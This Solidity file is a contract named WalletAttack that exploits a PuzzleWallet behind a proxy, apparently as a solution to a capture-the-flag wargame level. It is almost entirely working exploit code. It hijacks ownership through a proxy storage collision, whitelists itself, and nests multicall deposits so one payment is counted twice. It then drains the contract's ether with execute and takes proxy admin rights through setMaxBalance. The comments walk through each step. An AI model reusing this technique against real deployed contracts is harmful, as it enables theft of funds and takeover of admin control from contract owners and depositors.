// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "./PuzzleWallet.sol";

contract WalletAttack {
    PuzzleWallet wallet =
        PuzzleWallet(0xb88eabe862b6a7801B34Eb5DDfe6e58EF209D32e);
    PuzzleProxy px = PuzzleProxy(0xb88eabe862b6a7801B34Eb5DDfe6e58EF209D32e);

    // 0xb88eabe862b6a7801B34Eb5DDfe6e58EF209D32e

    function changeOwner() external {
        // making ourselves owner of wallet
        px.proposeNewAdmin(msg.sender);
    }

    function addWhitelist() external {
        //whitelisting our address and contract
        wallet.addToWhitelist(msg.sender);
        wallet.addToWhitelist(address(this));
    }

    function attack() external payable {
        //creating encoded function data
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(
            wallet.multicall.selector,
            depositSelector
        );

        //calling multicall with nested data stored above, value set to 0.001 eth
        wallet.multicall{value: msg.value}(nestedMulticall);
        //calling execute to drain the contract
        wallet.execute(msg.sender, 0.002 ether, "");
        //calling setMaxBalance with our address to become the admin of proxy
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
        //making sure our exploit worked
    }
}
